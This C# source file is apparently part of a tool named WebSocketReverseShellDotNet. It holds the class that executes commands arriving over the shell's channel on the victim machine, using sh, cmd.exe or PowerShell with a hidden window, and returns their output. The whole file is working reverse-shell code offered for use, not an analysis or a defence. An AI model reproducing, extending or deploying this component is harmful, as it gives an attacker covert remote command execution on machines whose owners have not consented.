using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class SystemCommand : Command
    {
        
        public string ExecuteCommand(string command)
        {
            StringBuilder output = new StringBuilder();
            DirectoryInfo currentDir = SystemCommandUtil.CurrentWorkingDir;

            output.AppendLine($"Running in: {currentDir}");
            output.AppendLine($"Command: {command}");

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WorkingDirectory = currentDir.FullName,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                CheckOSForCommand(startInfo, command);

                using (Process process = new Process { StartInfo = startInfo })
                {
                    process.Start();

                    output.AppendLine(PrintStream(process.StandardOutput));
                    output.AppendLine(PrintStream(process.StandardError));

                    bool isFinished = process.WaitForExit(60000); // 60 seconds timeout

                    if (!isFinished)
                    {
                        process.Kill();
                    }
                }
            }
            catch (Exception e)
            {
                output.AppendLine($"Exception occurred with command: {e.Message}");
                /*Console.WriteLine(e);*/
            }

            return output.ToString();
        }

        private static void CheckOSForCommand(ProcessStartInfo startInfo, string command)
        {
            List<string> commands = new List<string>();

            if (SystemCommandUtil.IsWindows)
            {
                SetWindowsPrompt(commands);
            }
            else
            {
                // Use a Unix shell to run the command on non-Windows systems
                commands.Add("sh");
                commands.Add("-c");
            }

            commands.AddRange(command.Split(' '));
            startInfo.FileName = commands[0];
            startInfo.Arguments = string.Join(" ", commands.Skip(1));
        }

        private static void SetWindowsPrompt(List<string> commands)
        {
            if (SystemCommandUtil.RunPowerShell)
            {
                commands.Add("powershell");
                commands.Add("-Command");
            }
            else
            {
                commands.Add("cmd.exe");
                commands.Add("/c");
            }
        }

        private static string PrintStream(StreamReader streamReader)
        {
            StringBuilder output = new StringBuilder();
            string line;
            while ((line = streamReader.ReadLine()) != null)
            {
                output.AppendLine(line);
            }
            return output.ToString();
        }




    }
}
